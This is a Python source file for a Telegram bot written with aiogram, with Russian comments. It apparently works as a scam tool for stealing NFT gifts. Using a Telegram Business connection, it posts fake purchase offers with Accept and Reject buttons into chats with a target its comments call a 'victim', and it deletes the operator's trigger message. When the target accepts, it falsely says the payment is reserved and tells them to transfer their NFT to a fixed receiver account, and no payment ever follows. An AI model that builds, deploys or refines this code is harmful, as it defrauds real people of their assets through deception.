import os
import re
import asyncio
import logging
import sys
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatType
from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, BusinessConnection)
from dotenv import load_dotenv

from app import make_offer, get_offer, BASE

load_dotenv()
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
log = logging.getLogger("offerbot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
BASE_URL = os.getenv("WEBAPP_BASE", "http://localhost:8080")
RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

BUSINESS_CONN_ID = None

NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)")
PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐)", re.I)

def parse_nft(url: str):
    m = NFT_RE.search(url)
    if not m: return None
    slug_raw = m.group(1)
    parts = slug_raw.rsplit("-", 1)
    if len(parts) == 2 and parts[1].isdigit():
        name_raw, num = parts
    else:
        name_raw, num = slug_raw, ""
    display = re.sub(r"(?<!^)(?=[A-Z])", " ", name_raw).strip()
    full = f"{display} #{num}" if num else display
    return {"slug": slug_raw, "name": full}

def parse_price(text: str):
    m = PRICE_RE.search(text)
    if not m: return None
    amount, unit = m.group(1), m.group(2).lower()
    return f"{amount} Gram" if unit in ("gram", "грам") else f"{amount} Stars"


# ==========================================
# ЛОВИМ ВСЁ В BUSINESS-ЧАТАХ (с жертвой)
# ==========================================
@router.business_message(F.text)
async def handle_business_message(msg: Message):
    if msg.from_user and msg.from_user.id != ADMIN_ID:
        return

    nft = parse_nft(msg.text)
    price = parse_price(msg.text)

    if not nft or not price:
        return  # Обычная болтовня — игнорируем

    log.info(f"Перехват в бизнес-чате! nft={nft['name']}, price={price}")

    target_chat = msg.chat.id
    target_user = msg.from_user.username or "buyer"

    # Создаем оффер в БД
    oid = make_offer(
        nft_name=nft["name"], nft_slug=nft["slug"], price=price,
        buyer=target_user, target_user="target", target_chat_id=target_chat)

    if not BUSINESS_CONN_ID:
        log.error("Нет BUSINESS_CONN_ID! Бот не подключен к Business.")
        return

    # 1. ОТПРАВЛЯЕМ КНОПКИ (Первое сообщение)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
         InlineKeyboardButton(text="Принять", callback_data=f"accept:{oid}")]
    ])
    
    try:
        await bot.send_message(
            chat_id=target_chat, 
            text="\u200b", # Невидимый символ, чтобы не было пустоты
            reply_markup=kb, 
            business_connection_id=BUSINESS_CONN_ID
        )
        
        # 2. ОТПРАВЛЯЕМ КАРТОЧКУ (Второе сообщение)
        card_text = (
            f"Пользователь <b>{target_user}</b> предлагает Вам <b>{price}</b> "
            f"за подарок <b>{nft['name']}</b>.\n\n"
            f"Предложение действует ещё <b>6ч 0м</b>.\n\n"
            f"https://t.me/nft/{nft['slug']}"
        )
        await bot.send_message(
            chat_id=target_chat,
            text=card_text,
            business_connection_id=BUSINESS_CONN_ID,
            disable_web_page_preview=False # Чтобы подтянулась карточка подарка
        )
        
        # 3. УДАЛЯЕМ ТВОЮ КОМАНДУ
        try:
            await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
        except Exception as e:
            log.warning(f"Не смог удалить сообщение: {e}")
            
    except Exception as e:
        log.error(f"Ошибка отправки: {e}")


# ==========================================
# КНОПКИ "ОТКЛОНИТЬ" И "ПРИНЯТЬ"
# ==========================================
@router.callback_query(F.data.startswith("reject:"))
async def on_reject(cb: CallbackQuery):
    try:
        await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.answer("Вы отклонили предложение.")

@router.callback_query(F.data.startswith("accept:"))
async def on_accept(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    o = get_offer(oid)
    if not o: 
        await cb.answer("Оффер истек", show_alert=True)
        return
    
    # Отправляем инструкцию от твоего имени
    if BUSINESS_CONN_ID:
        text = (
            f"<b>Сумма {o['price']} зарезервирована.</b>\n\n"
            f"Чтобы завершить сделку:\n"
            f"1. Нажмите на карточку подарка выше\n"
            f"2. Выберите «Передать NFT»\n"
            f"3. Укажите получателя: <b>@{RECEIVER}</b>\n"
            f"4. Подтвердите передачу."
        )
        await bot.send_message(
            chat_id=cb.message.chat.id, 
            text=text, 
            business_connection_id=BUSINESS_CONN_ID
        )
    
    # Убираем кнопки, чтобы нельзя было нажать дважды
    try:
        await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.answer()


# ==========================================
# ПРИЕМ BUSINESS ПОДКЛЮЧЕНИЯ
# ==========================================
@router.business_connection()
async def on_business_conn(conn: BusinessConnection):
    global BUSINESS_CONN_ID
    BUSINESS_CONN_ID = conn.id
    log.info(f"✅ Business connection УСТАНОВЛЕН: user={conn.user.id} id={conn.id}")


# ==========================================
# ЗАПУСК
# ==========================================
async def main():
    log.info("Starting bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    import threading
    from app import flask_app

    def _run_flask():
        port = int(os.getenv("PORT", "8080"))
        log.info(f"Flask listening on 0.0.0.0:{port}")
        flask_app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False)

    threading.Thread(target=_run_flask, daemon=True).start()
    asyncio.run(main())
